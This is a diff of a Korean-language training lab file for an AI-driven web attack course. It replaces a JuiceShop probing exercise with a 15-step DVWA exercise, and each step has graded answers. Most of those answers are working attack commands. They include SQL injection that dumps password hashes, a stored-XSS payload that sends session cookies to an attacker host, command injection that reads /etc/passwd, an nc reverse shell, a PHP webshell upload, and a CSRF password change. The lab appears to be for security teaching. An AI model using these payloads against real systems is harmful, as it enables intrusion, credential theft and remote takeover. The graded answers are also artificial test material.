@@ -1,123 +1,215 @@
-lab_id: "battle-ai-week03"
-title: "AI 웹 공격 — 자동화된 웹 취약점 테스트"
-version: "ai"
-course: "battle-ai"
+lab_id: battle-ai-week03
+title: AI 기반 웹 애플리케이션 공격 — SQL Injection, XSS, 파일 업로드
+version: ai
+course: battle-ai
 week: 3
-description: "AI 에이전트가 SQL Injection, XSS 등 웹 취약점을 자동으로 테스트한다. sqlmap과 curl 페이로드를 활용한다."
-difficulty: "medium"
-duration_minutes: 90
+description: AI 에이전트가 자동으로 실행하는 OWASP Top 10 기반 웹 취약점을 실습한다. SQL Injection, XSS, C... ommand Injection, 파일 업로드 취약점을 직접 공격하며, 각 취약점의 원리와 영향을 이해한다. DVWA를 대상으로 실습한다.
+difficulty: medium
+duration_minutes: 120
 objectives:
-  - "AI가 SQL Injection 페이로드를 자동 전송한다"
-  - "AI가 sqlmap으로 자동 DB 탐색을 수행한다"
-  - "AI가 XSS 취약점을 자동 테스트한다"
-  - "AI가 발견된 취약점의 심각도를 판단한다"
+- SQL Injection의 원리를 이해하고 수동으로 공격을 수행한다
+- XSS(Reflected/Stored)를 활용한 세션 탈취를 실습한다
+- Command Injection과 파일 업로드 취약점을 공략한다
 prerequisites:
-  - "Week 02 AI 취약점 스캐닝 완료"
-  - "HTTP 프로토콜 이해"
-  - "SQL 기본 문법"
+- HTTP 프로토콜 기초
+- SQL 기본 문법
+- HTML/JavaScript 기초
 infra_requirements:
-  - "attacker VM with bastion"
-  - "defender VM (JuiceShop on port 3000)"
+- Kali Linux VM (attacker)
+- DVWA on Metasploitable2 (10.20.30.50)
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "AI가 대상 웹 애플리케이션을 탐색하여 입력 포인트를 식별한다"
-    script: |
-      echo "=== 웹 애플리케이션 입력 포인트 탐색 ==="
-      curl -s http://10.20.30.80:3000/ | grep -oP '(action|href|src)="[^"]*"' | head -20
-      echo ""
-      echo "=== 폼 필드 탐색 ==="
-      curl -s http://10.20.30.80:3000/ | grep -oP '<input[^>]*>' | head -20
-      echo ""
-      echo "=== API 엔드포인트 탐색 ==="
-      curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -30
-    category: "recon"
-    risk_level: "low"
-    points: 10
-    verify:
-      type: "output_contains"
-      expect: "입력 포인트 탐색"
-      field: "stdout"
-
-  - order: 2
-    instruction: "AI가 SQL Injection 페이로드를 로그인 폼에 전송하여 취약점을 테스트한다"
-    script: |
-      echo "=== SQLi 테스트 1: 기본 인증 우회 ==="
-      curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-        -H "Content-Type: application/json" \
-        -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' | head -5
-      echo ""
-      echo "=== SQLi 테스트 2: UNION 기반 ==="
-      curl -s "http://10.20.30.80:3000/rest/products/search?q=test'+UNION+SELECT+NULL--" | head -5
-      echo ""
-      echo "=== SQLi 테스트 3: 에러 기반 ==="
-      curl -s "http://10.20.30.80:3000/rest/products/search?q=test'" | head -5
-    category: "exploit"
-    risk_level: "medium"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "SQLi 테스트"
-      field: "stdout"
-
-  - order: 3
-    instruction: "AI가 sqlmap으로 자동 SQL Injection 탐지 및 DB 열거를 수행한다"
-    script: |
-      sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
-        --batch --level=2 --risk=1 \
-        --output-dir=/tmp/sqlmap_output \
-        --threads=4 2>&1 | tail -30
-    category: "exploit"
-    risk_level: "medium"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "sqlmap"
-      field: "stdout"
-
-  - order: 4
-    instruction: "AI가 Reflected XSS 페이로드를 자동 테스트한다"
-    script: |
-      echo "=== XSS 테스트 1: 기본 script 태그 ==="
-      curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -c "script" | xargs -I{} echo "script 태그 반영: {}건"
-      echo ""
-      echo "=== XSS 테스트 2: img onerror ==="
-      curl -s "http://10.20.30.80:3000/rest/products/search?q=<img+src=x+onerror=alert(1)>" | grep -c "onerror" | xargs -I{} echo "img onerror 반영: {}건"
-      echo ""
-      echo "=== XSS 테스트 3: SVG onload ==="
-      curl -s "http://10.20.30.80:3000/rest/products/search?q=<svg+onload=alert(1)>" | grep -c "onload" | xargs -I{} echo "svg onload 반영: {}건"
-      echo ""
-      echo "XSS 자동 테스트 완료"
-    category: "exploit"
-    risk_level: "medium"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "XSS 자동 테스트 완료"
-      field: "stdout"
-
-  - order: 5
-    instruction: "AI가 웹 공격 결과를 종합하여 취약점 보고서를 생성한다"
-    script: |
-      echo "=== AI 웹 공격 종합 보고서 ===" > /tmp/web_attack_report.txt
-      echo "대상: http://10.20.30.80:3000" >> /tmp/web_attack_report.txt
-      echo "테스트 시간: $(date)" >> /tmp/web_attack_report.txt
-      echo "" >> /tmp/web_attack_report.txt
-      echo "[SQL Injection]" >> /tmp/web_attack_report.txt
-      echo "  - 인증 우회: 테스트 완료" >> /tmp/web_attack_report.txt
-      echo "  - UNION Injection: 테스트 완료" >> /tmp/web_attack_report.txt
-      echo "  - Error-based: 테스트 완료" >> /tmp/web_attack_report.txt
-      echo "" >> /tmp/web_attack_report.txt
-      echo "[XSS]" >> /tmp/web_attack_report.txt
-      echo "  - Reflected XSS: 테스트 완료" >> /tmp/web_attack_report.txt
-      echo "" >> /tmp/web_attack_report.txt
-      echo "[sqlmap 결과]" >> /tmp/web_attack_report.txt
-      ls /tmp/sqlmap_output/ 2>/dev/null && echo "  sqlmap 출력 존재" >> /tmp/web_attack_report.txt || echo "  sqlmap 출력 없음" >> /tmp/web_attack_report.txt
-      cat /tmp/web_attack_report.txt
-    category: "analysis"
-    risk_level: "low"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "AI 웹 공격 종합 보고서"
-      field: "stdout"
+- order: 1
+  instruction: DVWA 웹 애플리케이션에 접속하여 로그인하라. (admin/password)
+  hint: 브라우저 또는 curl로 접근한다.
+  category: exploit
+  points: 5
+  answer: curl -c /tmp/dvwa_cookies.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.50/dvwa/login.php
+  answer_detail: DVWA의 기본 계정은 admin/password이다. curl -c 옵션으로 쿠키를 파일에 저장하면 이후 인증된 상태로 요청을 보낼 수 있다.
+  verify:
+    type: file_exists
+    expect: /tmp/dvwa_cookies.txt
+    field: filesystem
+  script: curl -c /tmp/dvwa_cookies.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.50/dvwa/login.php
+- order: 2
+  instruction: DVWA의 보안 레벨을 'low'로 설정하라.
+  hint: Security 페이지에서 설정을 변경한다.
+  category: exploit
+  points: 5
+  answer: curl -b /tmp/dvwa_cookies.txt -d 'security=low&seclev_submit=Submit' http://10.20.30.50/dvwa/security.php
+  answer_detail: DVWA는 low, medium, high, impossible 4단계 보안 레벨을 제공한다. low에서는 입력 검증이 전혀 없어 취약점 원리를 가장 명확하게 학습할 수 있다.
+  verify:
+    type: output_contains
+    expect: '200'
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt -d 'security=low&seclev_submit=Submit' http://10.20.30.50/dvwa/security.php
+- order: 3
+  instruction: SQL Injection 페이지에서 ' OR '1'='1 입력으로 모든 사용자 정보를 추출하라.
+  hint: User ID 필드에 SQL 구문을 삽입한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
+  answer_detail: SQL Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생한다. ' OR '1'='1 구문은 WHERE 조건을 항상 참으로 만들어 모든 레코드를 반환하게 한다. URL 인코딩이 필요하다.
+  verify:
+    type: output_contains
+    expect: First name
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
+- order: 4
+  instruction: UNION SELECT를 사용하여 데이터베이스 버전 정보를 추출하라.
+  hint: UNION SELECT와 @@version을 사용한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2C@@version--+&Submit=Submit"
+  answer_detail: UNION SELECT는 원래 쿼리에 추가 SELECT 결과를 병합한다. @@version은 MySQL의 버전 정보를 반환하는 시스템 변수이다. 컬럼 수를 맞추는 것이 핵심이며, -- 주석으로 나머지 쿼리를 무력화한다.
+  verify:
+    type: output_contains
+    expect: Ubuntu
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2C@@version--+&Submit=Submit"
+- order: 5
+  instruction: SQL Injection으로 데이터베이스의 모든 테이블 이름을 추출하라.
+  hint: information_schema.tables를 활용한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
+  answer_detail: information_schema는 MySQL 메타데이터를 저장하는 시스템 데이터베이스이다. table_schema=database()로 현재 DB의 테이블만 필터링하고, group_concat()으로 여러 행을 하나의 문자열로 합친다.
+  verify:
+    type: output_contains
+    expect: users
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
+- order: 6
+  instruction: SQL Injection으로 users 테이블의 패스워드 해시를 추출하라.
+  hint: users 테이블의 user, password 컬럼을 SELECT한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users--+&Submit=Submit"
+  answer_detail: users 테이블에서 직접 user와 password 컬럼을 조회한다. 패스워드는 MD5 해시로 저장되어 있다. 실무에서 이렇게 유출된 해시는 hashcat이나 john으로 크래킹할 수 있다.
+  verify:
+    type: output_contains
+    expect: admin
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users--+&Submit=Submit"
+- order: 7
+  instruction: sqlmap을 사용하여 SQL Injection을 자동으로 공격하고 데이터베이스를 덤프하라.
+  hint: sqlmap -u 옵션으로 취약한 URL을 지정한다.
+  category: exploit
+  points: 10
+  answer: sqlmap -u "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(cat /tmp/dvwa_cookies.txt | grep PHPSESSID | awk '{print $NF}')" --batch --dbs
+  answer_detail: sqlmap은 SQL Injection 자동화 도구이다. --batch 옵션은 모든 질문에 기본값으로 답하고, --dbs는 데이터베이스 목록을 열거한다. 쿠키를 포함해야 인증된 상태로 공격할 수 있다.
+  verify:
+    type: output_contains
+    expect: available databases
+    field: stdout
+  script: sqlmap -u "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(cat /tmp/dvwa_cookies.txt | grep PHPSESSID | awk '{print $NF}')" --batch --dbs
+- order: 8
+  instruction: Reflected XSS 취약점 페이지에서 alert 창을 띄우는 XSS 페이로드를 삽입하라.
+  hint: <script> 태그를 사용한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
+  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. <script>alert('XSS')</script>가 HTML에 삽입되어 브라우저에서 실행된다. 실무에서는 세션 쿠키 탈취에 사용된다.
+  verify:
+    type: output_contains
+    expect: <script>
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
+- order: 9
+  instruction: Stored XSS 취약점 페이지(Guestbook)에 영구적인 XSS 페이로드를 삽입하라.
+  hint: 방명록에 스크립트를 포함한 메시지를 작성한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt -d "txtName=hacker&mtxMessage=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F10.20.30.10%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E&btnSign=Sign+Guestbook"
+    http://10.20.30.50/dvwa/vulnerabilities/xss_s/
+  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 페이지를 방문하는 모든 사용자에게 실행된다. document.cookie를 외부 서버로 전송하면 세션 하이재킹이 가능하다. Reflected보다 영향 범위가 넓어 더 위험하다.
+  verify:
+    type: output_contains
+    expect: script
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt -d "txtName=hacker&mtxMessage=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F10.20.30.10%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E&btnSign=Sign+Guestbook"
+    http://10.20.30.50/dvwa/vulnerabilities/xss_s/
+- order: 10
+  instruction: Command Injection 취약점 페이지에서 서버의 /etc/passwd 파일을 읽어라.
+  hint: 세미콜론(;)으로 명령을 연결한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+  answer_detail: Command Injection은 사용자 입력이 시스템 명령에 직접 삽입될 때 발생한다. 세미콜론(;)은 리눅스에서 명령 구분자로, 원래 명령(ping) 뒤에 임의 명령(cat)을 추가 실행한다.
+  verify:
+    type: output_contains
+    expect: 'root:'
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+- order: 11
+  instruction: 'Command Injection으로 리버스 셸을 설정하라. (Kali IP: 10.20.30.10)'
+  hint: netcat 리스너를 먼저 설정하고, 파이프를 활용한다.
+  category: exploit
+  points: 15
+  answer: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;nc+-e+/bin/bash+10.20.30.10+4444&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+  answer_detail: nc -e /bin/bash는 netcat으로 원격 셸을 전달하는 리버스 셸이다. 공격자 시스템에서 nc -lvp 4444로 대기하면 대상이 연결하여 셸 접근 권한을 획득한다. 방화벽 우회에 효과적이다.
+  verify:
+    type: output_contains
+    expect: 127.0.0.1
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;nc+-e+/bin/bash+10.20.30.10+4444&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+- order: 12
+  instruction: 파일 업로드 취약점을 이용하여 PHP 웹셸을 업로드하라.
+  hint: 간단한 PHP 파일을 생성하여 업로드한다.
+  category: exploit
+  points: 10
+  answer: echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php && curl -b /tmp/dvwa_cookies.txt -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/shell.php" -F "Upload=Upload" http://10.20.30.50/dvwa/vulnerabilities/upload/
+  answer_detail: 파일 업로드 취약점은 서버 측 파일 검증이 부족할 때 발생한다. PHP 웹셸을 업로드하면 URL을 통해 임의 명령을 실행할 수 있다. system() 함수가 GET 파라미터를 실행하는 원리이다.
+  verify:
+    type: output_contains
+    expect: succesfully uploaded
+    field: stdout
+  script: echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php && curl -b /tmp/dvwa_cookies.txt -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/shell.php" -F "Upload=Upload" http://10.20.30.50/dvwa/vulnerabilities/upload/
+- order: 13
+  instruction: 업로드한 웹셸을 통해 서버에서 id 명령을 실행하라.
+  hint: 업로드된 파일 경로에 cmd 파라미터를 전달한다.
+  category: exploit
+  points: 10
+  answer: curl "http://10.20.30.50/dvwa/hackable/uploads/shell.php?cmd=id"
+  answer_detail: 업로드된 PHP 파일은 hackable/uploads/ 디렉토리에 저장된다. cmd=id 파라미터를 전달하면 system('id')가 실행되어 현재 사용자 정보(www-data)를 반환한다.
+  verify:
+    type: output_contains
+    expect: www-data
+    field: stdout
+  script: curl "http://10.20.30.50/dvwa/hackable/uploads/shell.php?cmd=id"
+- order: 14
+  instruction: CSRF 토큰이 없는 패스워드 변경 페이지를 공격하여 admin 비밀번호를 변경하라.
+  hint: DVWA CSRF 페이지에 GET 요청으로 패스워드를 변경한다.
+  category: exploit
+  points: 10
+  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
+  answer_detail: CSRF(Cross-Site Request Forgery)는 인증된 사용자의 권한으로 의도하지 않은 요청을 실행하는 공격이다. low 레벨에서는 CSRF 토큰 검증이 없어 URL만으로 패스워드를 변경할 수 있다.
+  verify:
+    type: output_contains
+    expect: Password Changed
+    field: stdout
+  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
+- order: 15
+  instruction: 이번 주 웹 공격 실습 결과를 정리하여 취약점 보고서를 작성하라. 각 취약점의 유형, 심각도, 공격 증거, 대응 방안을 포함하라.
+  hint: OWASP Top 10 분류를 참고한다.
+  category: analysis
+  points: 15
+  answer: "cat > /tmp/web_vuln_report.txt << 'EOF'\n=== Web Vulnerability Assessment Report ===\nTarget: DVWA on 10.20.30.50\n\n1. SQL Injection (OWASP A03:2021)\n   Severity: Critical (CVSS 9.8)\n   Evidence:\
+    \ Extracted all user credentials via UNION SELECT\n   Remediation: Parameterized queries, input validation\n\n2. Cross-Site Scripting - Reflected (OWASP A07:2021)\n   Severity: High (CVSS 7.1)\n   Evidence:\
+    \ JavaScript execution via name parameter\n   Remediation: Output encoding, CSP headers\n\n3. Cross-Site Scripting - Stored (OWASP A07:2021)\n   Severity: Critical (CVSS 9.0)\n   Evidence: Persistent\
+    \ script in guestbook\n   Remediation: Input sanitization, output encoding\n\n4. OS Command Injection (OWASP A03:2021)\n   Severity: Critical (CVSS 10.0)\n   Evidence: Read /etc/passwd, reverse shell\n\
+    \   Remediation: Avoid system(), use allowlist\n\n5. Unrestricted File Upload (OWASP A04:2021)\n   Severity: Critical (CVSS 9.8)\n   Evidence: PHP webshell uploaded and executed\n   Remediation: File\
+    \ type validation, upload directory restrictions\n\n6. CSRF (OWASP A01:2021)\n   Severity: High (CVSS 8.0)\n   Evidence: Password changed without CSRF token\n   Remediation: Anti-CSRF tokens, SameSite\
+    \ cookies\nEOF"
+  answer_detail: 취약점 보고서는 침투 테스트의 최종 산출물이다. OWASP Top 10 분류, CVSS 점수, 구체적 증거, 그리고 실행 가능한 대응 방안을 포함해야 한다. 이 보고서를 바탕으로 개발팀이 취약점을 수정한다.
+  verify:
+    type: file_exists
+    expect: /tmp/web_vuln_report.txt
+    field: filesystem
+  script: "cat > /tmp/web_vuln_report.txt << 'EOF'\n=== Web Vulnerability Assessment Report ===\nTarget: DVWA on 10.20.30.50\n\n1. SQL Injection (OWASP A03:2021)\n   Severity: Critical (CVSS 9.8)\n   Evidence:\
+    \ Extracted all user credentials via UNION SELECT\n   Remediation: Parameterized queries, input validation\n\n2. Cross-Site Scripting - Reflected (OWASP A07:2021)\n   Severity: High (CVSS 7.1)\n   Evidence:\
+    \ JavaScript execution via name parameter\n   Remediation: Output encoding, CSP headers\n\n3. Cross-Site Scripting - Stored (OWASP A07:2021)\n   Severity: Critical (CVSS 9.0)\n   Evidence: Persistent\
+    \ script in guestbook\n   Remediation: Input sanitization, output encoding\n\n4. OS Command Injection (OWASP A03:2021)\n   Severity: Critical (CVSS 10.0)\n   Evidence: Read /etc/passwd, reverse shell\n\
+    \   Remediation: Avoid system(), use allowlist\n\n5. Unrestricted File Upload (OWASP A04:2021)\n   Severity: Critical (CVSS 9.8)\n   Evidence: PHP webshell uploaded and executed\n   Remediation: File\
+    \ type validation, upload directory restrictions\n\n6. CSRF (OWASP A01:2021)\n   Severity: High (CVSS 8.0)\n   Evidence: Password changed without CSRF token\n   Remediation: Anti-CSRF tokens, SameSite\
+    \ cookies\nEOF"
